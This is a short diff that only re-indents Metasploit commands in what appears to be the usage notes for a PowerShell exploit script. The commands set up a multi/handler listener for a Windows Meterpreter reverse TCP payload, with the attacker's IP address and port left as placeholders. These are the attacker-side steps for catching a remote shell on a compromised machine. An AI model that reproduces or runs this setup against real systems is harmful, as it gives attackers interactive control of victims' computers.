@@ -32,12 +32,12 @@ powershell ./exploit.ps1
 
 msfconsole
 
-use exploit/multi/handler
-
-set PAYLOAD windows/meterpreter/reverse_tcp
-
-set LHOST <your_ip>
-
-set LPORT <port_you_listen>
-
-run
+  use exploit/multi/handler
+  
+  set PAYLOAD windows/meterpreter/reverse_tcp
+  
+  set LHOST <your_ip>
+  
+  set LPORT <port_you_listen>
+  
+  run
